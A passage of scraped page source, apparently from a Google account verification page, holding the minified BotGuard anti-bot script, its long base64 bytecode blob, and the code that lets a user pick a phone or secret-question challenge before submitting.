if(b!=a.d&&b!=a.f&&b!=a.h||!a.c[b])a.c[b]=J(c,a.a);b==a.r&&(a.u=k,z(a,a.b,a.a(a.b)+4))},K=function(a,b,c,d,e){for(a=a.replace(/\\r\\n/g,"\\n"),b=[],d=c=0;d<a.length;d++)e=a.charCodeAt(d),128>e?b[c++]=e:(2048>e?b[c++]=e>>6|192:(b[c++]=e>>12|224,b[c++]=e>>6&63|128),b[c++]=e&63|128);return b},L=function(a,b){return b<=a.aa?b==a.h||b==a.d||b==a.f||b==a.q?a.o:b==a.N||b==a.H||b==a.I||b==a.k?a.v:b==a.w?a.i:b==a.j||b==a.p?2:b==a.l?1:4:[1,2,4,a.o,a.v,a.i][b%a.ba]},G=function(a,b,c){if(b=a.a(a.b),!(b in a.e))throw a.g(a.Y),a.A;return a.u==k&&(a.u=x(a.e,b-4),a.C=k),a.C!=b>>3&&(a.C=b>>3,c=[0,0,0,a.a(a.r)],a.Z=I(a.u,a.C,c)),z(a,a.b,b+1),a.e[b]^a.Z[b%8]},J=function(a,b,c,d,e,h,l,n,m){return n=M,e=M.prototype,h=e.t,l=e.Q,m=e.g,d=function(){return c()},c=function(a,r,u){for(u=0,a=d[e.F],r=a===b,a=a&&a[e.F];a&&a!=h&&a!=l&&a!=n&&a!=m&&20>u;)u++,a=a[e.F];return c[e.ga+r+!(!a+(u>>2))]},d[e.J]=e,c[e.fa]=a,a=k,d},N=function(a,b,c,d,e,h){for(e=a.a(b),b=b==a.f?function(b,c,d,h){if(c=e.length,d=c-4>>3,e.da!=d){e.da=d,d=(d<<3)-4,h=[0,0,0,a.a(a.G)];try{e.ca=I(x(e,d),x(e,d+4),h)}catch(r){throw r;}}e.push(e.ca[c&7]^b)}:function(a){e.push(a)},d&&b(d&255),h=0,d=c.length;h<d;h++)b(c[h])},M=function(a,b,c,d,e,h){try{if(this.c=[],z(this,this.b,0),z(this,this.m,0),z(this,this.r,0),z(this,this.h,[]),z(this,this.d,[]),z(this,this.H,"object"==typeof window?window:g),z(this,this.I,this),z(this,this.l,0),z(this,this.p,0),z(this,this.G,0),z(this,this.f,w(4)),z(this,this.q,[]),z(this,this.k,{}),z(this,this.j,2048),this.s=true,a&&"!"==a[0])this.n=a;else{if(window.atob){for(c=window.atob(a),a=[],e=d=0;e<c.length;e++){for(h=c.charCodeAt(e);255<h;)a[d++]=h&255,h>>=8;a[d++]=h}b=a}else b=null;(this.e=b)&&this.e.length?(this.K=[],this.t()):this.g(this.U)}}catch(l){v(this,l)}};f=M.prototype,f.b=0,f.r=1,f.h=2,f.m=3,f.d=4,f.w=5,f.N=6,f.j=7,f.L=8,f.H=9,f.I=10,f.l=11,f.p=12,f.G=13,f.f=14,f.q=15,f.k=16,f.aa=17,f.R=15,f.$=12,f.S=10,f.T=42,f.ba=6,f.i=-1,f.o=-2,f.v=-3,f.U=17,f.W=21,f.B=22,f.ea=30,f.Y=31,f.X=33,f.A={},f.F="caller",f.J="toString",f.ga=34,f.fa=36,M.prototype.a=function(a,b){if(b=this.c[a],b===k)throw this.g(this.ea,0,a),this.A;return b()},M.prototype.ka=function(a,b,c,d){d=a[(b+2)%3],a[b]=a[b]-a[(b+1)%3]-d^(1==b?d<<c:d>>>c)},M.prototype.ja=function(a,b,c,d){if(3==a.length){for(c=0;3>c;c++)b[c]+=a[c];for(c=0,d=[13,8,13,12,16,5,3,10,15];9>c;c++)b[3](b,c%3,d[c])}},M.prototype.la=function(a,b){b.push(a[0]<<24|a[1]<<16|a[2]<<8|a[3]),b.push(a[4]<<24|a[5]<<16|a[6]<<8|a[7]),b.push(a[8]<<24|a[9]<<16|a[10]<<8|a[11])},M.prototype.g=function(a,b,c,d){d=this.a(this.m),a=[a,d>>8&255,d&255],c!=k&&a.push(c),0==this.a(this.h).length&&(this.c[this.h]=k,z(this,this.h,a)),c="",b&&(b.message&&(c+=b.message),b.stack&&(c+=":"+b.stack)),b=this.a(this.j),3<b&&(c=c.slice(0,b-3),b-=c.length+3,c=K(c),N(this,this.f,E(c.length,2).concat(c),this.$)),z(this,this.j,b)},f.M=[function(){},function(a,b,c,d,e){b=G(a),c=G(a),d=a.a(b),b=L(a,b),e=L(a,c),e==a.i||e==a.o?d=""+d:0<b&&(1==b?d&=255:2==b?d&=65535:4==b&&(d&=4294967295)),z(a,c,d)},function(a,b,c,d,e,h,l,n,m){if(b=G(a),c=L(a,b),0<c){for(d=0;c--;)d=d<<8|G(a);z(a,b,d)}else if(c!=a.v){if(d=G(a)<<8|G(a),c==a.i)if(c="",a.c[a.w]!=k)for(e=a.a(a.w);d--;)h=e[G(a)<<8|G(a)],c+=h;else{for(c=Array(d),e=0;e<d;e++)c[e]=G(a);for(d=c,c=[],h=e=0;e<d.length;)l=d[e++],128>l?c[h++]=String.fromCharCode(l):191<l&&224>l?(n=d[e++],c[h++]=String.fromCharCode((l&31)<<6|n&63)):(n=d[e++],m=d[e++],c[h++]=String.fromCharCode((l&15)<<12|(n&63)<<6|m&63));c=c.join("")}else for(c=Array(d),e=0;e<d;e++)c[e]=G(a);z(a,b,c)}},function(a){G(a)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),c=a.a(c),b=a.a(b),z(a,d,b[c])},function(a,b,c){b=G(a),c=G(a),b=a.a(b),z(a,c,t(b))},function(a,b,c,d,e){b=G(a),c=G(a),d=L(a,b),e=L(a,c),c!=a.h&&(d==a.i&&e==a.i?(a.c[c]==k&&z(a,c,""),z(a,c,a.a(c)+a.a(b))):e==a.o&&(0>d?(b=a.a(b),d==a.i&&(b=K(""+b)),c!=a.d&&c!=a.f&&c!=a.q||N(a,c,E(b.length,2)),N(a,c,b)):0<d&&N(a,c,E(a.a(b),d))))},function(a,b,c){b=G(a),c=G(a),z(a,c,function(a){return eval(a)}(a.a(b)))},function(a,b,c){b=G(a),c=G(a),z(a,c,a.a(c)-a.a(b))},function(a,b){b=H(a),z(a,b.P,b.O.apply(b.self,b.D))},function(a,b,c){b=G(a),c=G(a),z(a,c,a.a(c)%a.a(b))},function(a,b,c,d,e){b=G(a),c=a.a(G(a)),d=a.a(G(a)),e=a.a(G(a)),a.a(b).addEventListener(c,D(a,d,e,true),false)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),a.a(b)[a.a(c)]=a.a(d)},function(){},function(a,b,c){b=G(a),c=G(a),z(a,c,a.a(c)+a.a(b))},function(a,b,c){b=G(a),c=G(a),0!=a.a(b)&&z(a,a.b,a.a(c))},function(a,b,c,d){b=G(a),c=G(a),d=G(a),a.a(b)==a.a(c)&&z(a,d,a.a(d)+1)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),a.a(b)>a.a(c)&&z(a,d,a.a(d)+1)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),z(a,d,a.a(b)<<c)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),z(a,d,a.a(b)|a.a(c))},function(a,b){b=a.a(G(a)),A(a,b)},function(a,b,c,d){if(b=a.K.pop()){for(c=G(a);0<c;c--)d=G(a),b[d]=a.c[d];a.c=b}else z(a,a.b,a.e.length)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),z(a,d,(a.a(b)in a.a(c))+0)},function(a,b,c,d){b=G(a),c=a.a(G(a)),d=a.a(G(a)),z(a,b,D(a,c,d))},function(a,b,c){b=G(a),c=G(a),z(a,c,a.a(c)*a.a(b))},function(a,b,c,d){b=G(a),c=G(a),d=G(a),z(a,d,a.a(b)>>c)},function(a,b,c,d){b=G(a),c=G(a),d=G(a),z(a,d,a.a(b)||a.a(c))},function(a,b,c,d,e){b=H(a),c=b.D,d=b.self,e=b.O;switch(c.length){case 0:c=new d[e];break;case 1:c=new d[e](c[0]);break;case 2:c=new d[e](c[0],c[1]);break;case 3:c=new d[e](c[0],c[1],c[2]);break;case 4:c=new d[e](c[0],c[1],c[2],c[3]);break;default:a.g(a.B);return}z(a,b.P,c)},function(a,b,c,d,e,h){if(b=G(a),c=G(a),d=G(a),e=G(a),b=a.a(b),c=a.a(c),d=a.a(d),a=a.a(e),"object"==t(b)){for(h in e=[],b)e.push(h);b=e}for(e=0,h=b.length;e<h;e+=d)c(b.slice(e,e+d),a)}],M.prototype.ia=function(a){return(a=window.performance)&&a.now?function(){return a.now()|0}:function(){return+new Date}}(),M.prototype.ha=function(a,b){return b=this.Q(),a&&a(b),b},M.prototype.t=function(a,b,c,d,e,h){try{for(b=5001,c=k,d=0,a=this.e.length;--b&&(d=this.a(this.b))<a;)try{z(this,this.m,d),e=G(this)%this.M.length,(c=this.M[e])?c(this):this.g(this.W,0,e)}catch(l){l!=this.A&&((h=this.a(this.l))?(z(this,h,l),z(this,this.l,0)):this.g(this.B,l))}b||this.g(this.X)}catch(n){try{this.g(this.B,n)}catch(m){v(this,m)}}return this.a(this.k)},M.prototype.Q=function(a,b,c,d,e,h,l,n,m,y,r){if(this.n)return this.n;try{if(this.s=false,b=this.a(this.d).length,c=this.a(this.f).length,d=this.a(this.j),this.c[this.L]&&C(this,this.a(this.L)),e=this.a(this.h),0<e.length&&N(this,this.d,E(e.length,2).concat(e),this.R),h=this.a(this.p)&255,h-=this.a(this.d).length+4,l=this.a(this.f),4<l.length&&(h-=l.length+3),0<h&&N(this,this.d,E(h,2).concat(w(h)),this.S),4<l.length&&N(this,this.d,E(l.length,2).concat(l),this.T),n=[3].concat(this.a(this.d)),window.btoa?(y=window.btoa(F(n)),m=y=y.replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,"")):m=k,m)m="!"+m;else for(m="",e=0;e<n.length;e++)r=n[e][this.J](16),1==r.length&&(r="0"+r),m+=r;this.a(this.d).length=b,this.a(this.f).length=c,z(this,this.j,d),a=m,this.s=true}catch(u){v(this,u),a=this.n}return a};try{window.addEventListener("unload",function(){},false)}catch(O){}s("botguard.bg",M),s("botguard.bg.prototype.invoke",M.prototype.ha);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('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');
  </script>
<script type="text/javascript">
(function(){
  var challenges = [];
  var containsMapChallenge = false;
  var containsAuthzenChallenge = false;
  var containsOfflineOtpChallenge = false;
  var challengeValidators = [];
  
  challenges.push('PhoneVerificationChallenge');
  challenges.push('SecretQuestionChallenge');
  var setChallengeSelected = function(challenge, visible) {
  var radio = document.getElementById(challenge),
  label = document.getElementById(challenge + 'Label'),
  optionContent = document.getElementById(challenge + 'OptionContent');
  if (visible) {
  radio.checked = true;
  if (label) {
  label.className = "label-selected";
  }
  optionContent.className = "option-content option-content-selected";
  var inputElems = optionContent.getElementsByTagName('input')
  for (var i = 0; i < inputElems.length; i++) {
        if (inputElems[i].type != 'hidden') {
          inputElems[i].focus();
          break;
        }
      }
      if (!challengeValidators[challenge]) {
        
        document.getElementById('submitChallenge').disabled = false;
      } else {
        document.getElementById('submitChallenge').disabled =
            !challengeValidators[challenge]();
      }
    } else {
      radio.checked = false;
      if (label) {
        label.className = "label-unselected";
      }
      optionContent.className = "option-content option-content-unselected";
    }
  };

  
  var expandSelectedChallenge = function() {
    for (var i = 0; i < challenges.length; i++) {
      var challenge = challenges[i],
          radio = document.getElementById(challenge);
      setChallengeSelected(challenge, radio.checked);
    }
  };

  

  var calculateBotguardResponse = function () {
    
    



  try {
    document.bg.invoke(function(response) {
      document.getElementById('bgresponse').value = response;
    });
  } catch (err) {
    document.getElementById('bgresponse').value = '';
  }




    return true;
  }

  var formSubmitHandler = function() {
    
    document.getElementById('submitChallenge').disabled = true;

    if (containsMapChallenge) {
      if (!mapOnsubmitHandler()) {
        return false;
      }
    }

    
    calculateBotguardResponse();
    return true;
  };

  var initialize = function() {
    for (var i = 0; i < challenges.length; i++) {
      var radio = document.getElementById(challenges[i]);
      radio.onclick = function() {
        expandSelectedChallenge();
        return true;
      };
    }

    document.getElementById('challengeform').onsubmit = formSubmitHandler;
    if (containsMapChallenge) {
      mapOnloadHandler();
    }
    if (containsAuthzenChallenge) {
      authzenOnloadHandler();
    }
    if (containsOfflineOtpChallenge) {
      offlineOtpOnloadHandler();
    }

    expandSelectedChallenge();
  };
  window.onload = initialize;
})();

</script>
<script type="text/javascript">
(function() {
  var gaia = gaia || {};
  gaia.bind = function(fn, scope) {
  return function() {
  fn.apply(scope, arguments);
  };
